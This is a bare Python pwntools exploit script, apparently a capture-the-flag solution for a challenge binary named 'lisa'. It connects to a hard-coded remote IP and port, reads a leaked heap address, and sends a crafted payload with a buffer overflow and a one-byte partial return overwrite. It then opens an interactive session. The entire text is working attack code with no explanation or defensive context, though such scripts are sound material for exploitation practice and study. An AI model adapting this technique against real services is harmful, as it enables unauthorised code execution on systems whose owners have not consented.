from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#p = process("./lisa")
#gdb.attach(p)
p = remote("18.191.244.121", 12345)

p.recvuntil("share: ")
heap_leak = int(p.recvline()[2:], 16)
log.info(hex(heap_leak))
p.recvuntil("you alright...")

payload = p32(0) + p32(heap_leak) + p32(0x20)
p.send(payload)

p.recvuntil("mouth?")
payload = "a"*0x1c + "\x15" # read
p.send(payload)
p.send("\x00")
p.interactive()
